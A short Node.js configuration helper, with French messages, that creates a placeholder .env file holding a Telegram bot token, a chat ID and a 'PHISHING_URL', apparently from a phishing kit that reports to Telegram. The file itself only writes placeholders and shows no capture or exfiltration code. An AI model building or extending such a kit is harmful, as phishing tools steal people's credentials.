require('dotenv').config();
const fs = require('fs');
const path = require('path');
const chalk = require('chalk');

module.exports = {
  checkConfig: async () => {
    const envPath = path.join(__dirname, '../../../.env');
    if (!fs.existsSync(envPath)) {
      console.log(chalk.yellow('Fichier .env non trouvé, création...'));
      fs.writeFileSync(envPath, 
        `TELEGRAM_BOT_TOKEN=your_bot_token\n` +
        `TELEGRAM_CHAT_ID=your_chat_id\n` +
        `PHISHING_URL=http://localhost:3000\n`
      );
      console.log(chalk.green('Fichier .env créé. Veuillez le configurer avant de continuer.'));
      process.exit(0);
    }
  }
};
